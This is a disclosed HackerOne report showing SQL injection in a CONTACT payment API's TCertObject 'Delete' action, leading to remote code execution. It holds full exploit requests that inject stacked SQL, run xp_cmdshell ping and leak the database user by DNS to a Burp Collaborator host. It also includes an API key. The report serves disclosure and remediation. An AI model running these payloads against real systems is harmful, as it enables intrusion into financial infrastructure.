---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '816086'
original_report_id: '816086'
title: Remote Code Execution on contactws.contact-sys.com via SQL injection in TCertObject
  operation "Delete"
weakness: Code Injection
team_handle: qiwi
created_at: '2020-03-10T16:14:49.061Z'
disclosed_at: '2020-06-19T06:03:37.380Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 194
asset_identifier: '*.contact-sys.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# Remote Code Execution on contactws.contact-sys.com via SQL injection in TCertObject operation "Delete"

## Metadata

- HackerOne Report ID: 816086
- Weakness: Code Injection
- Program: qiwi
- Disclosed At: 2020-06-19T06:03:37.380Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary

The API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `ID` parameter to inject arbitrary SQL statements into the underlying prepared statement. This leads to Remote Code Execution on the server and full database access to the underpinning database.

## Technical details

The interface on `contactws.contact-sys.com:3456` offers what looks like a test environment for CONTACT integrators to test their integrations. It accepts `<REQUEST/>` messages to the AppServ object, according to [your online documentation](https://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_02.03.2017.pdf).

I was able to use one of the `INT_SOFT_ID` in the documentation to get access to the method calls on the service, and brute forced the object class `TCertObject` and action `Delete`, which contains an SQL vulnerability in the `ID`.

The provided value gets included in a prepared statement as follows:

```sql
EXEC sp_SYS_ProtoOp @id=<ID injection>
, @op = 'D'
, @user_id = <userid>
```

To exploit this, it is possible to append an arbitrary number of SQL statements with the `;` delimiter, e.g. with `ID` set to:

```
1, @op='D', @user_id = 33; DECLARE @command varchar(255); SELECT @command='ping zknivz9q0j7isvd5izssm4i1xs3kr9.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; EXEC sp_SYS_ProtoOp @id=3
```

the query will look like this:

```sql
EXEC sp_SYS_ProtoOp @id=1
, @op='D'
, @user_id = 33;

DECLARE @command varchar(255);
SELECT @command='ping zknivz9q0j7isvd5izssm4i1xs3kr9.burpcollaborator.net';
EXEC Master.dbo.xp_cmdshell @command;

EXEC sp_SYS_ProtoOp @id=3
, @op = 'D'
, @user_id = <userid>
```

## Steps to reproduce

1. Execute the following request (change the burp collaborator URL to your own);

    ```http
    POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml

    <REQUEST OBJECT_CLASS="TCertObject" ACTION="delete" POINT_CODE="TZAA" OP_ID="ab" USER_ID="208930"
CardNumber="9700332007064935" Birthday="19900101" ID="1, @op='D', @user_id = 33; DECLARE @filename varchar(255); SELECT @filename='\\'+master.sys.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.xyy334me3sujnqmbzw913bw5815gwmmab.burpcollaborator.net\ohno'; EXEC Master.dbo.xp_fileexist @filename; EXEC sp_SYS_ProtoOp @id=3" REQUEST_ID="" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" SMSCode="" ExpectSigned="No" LANG="EN">
</REQUEST>
```

2. Watch your DNS logs as the following comes in:
    ```
0x7300740065006e0064005f00610064006d00.xyy334me3sujnqmbzw913bw5815gwmmab.burpcollaborator.net.
```
This first part decodes as `stend_adm`, indicating we have admin privileges on this test database.

3. Now to demonstrate Remote Code Execution, send the following request:

    ```http
    POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml

    <REQUEST OBJECT_CLASS="TCertObject" ACTION="delete" POINT_CODE="TZAA" OP_ID="ab" USER_ID="208930" CardNumber="9700332007064935" Birthday="19900101" ID="1, @op='D', @user_id = 33; DECLARE @command varchar(255); SELECT @command='ping zknivz9q0j7isvd5izssm4i1xs3kr9.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; EXEC sp_SYS_ProtoOp @id=3" REQUEST_ID="" INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" SMSCode="" ExpectSigned="No" LANG="EN"></REQUEST>
```

4. Notice that the server waits for a while when it's executing the `ping` command, and observe your Burp Collaborator to see the DNS resolution of the ping request.

## Disclaimer

Note that I stopped all further testing after successfully confirming the `ping` and `nslookup` commands during validation of this bug.

## Recommendation

SQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query. See the external references below for remediation details.

## References

[OWASP Prevention cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)

## To be clarified

It is unclear to me whether the interface on port 3456 is intended to be public or not, as I was also able to extract information via the provided object methods using the same `INT_SOFT_ID` key I found in the documentation. It appears to only provide access to what seems to be test data, but it seems like it circumvents the requirements of certificate-based authentication altogether.

If this is unintentional and you believe this to be a separate security problem, please let me know so I can report this separately.

## Impact

By executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
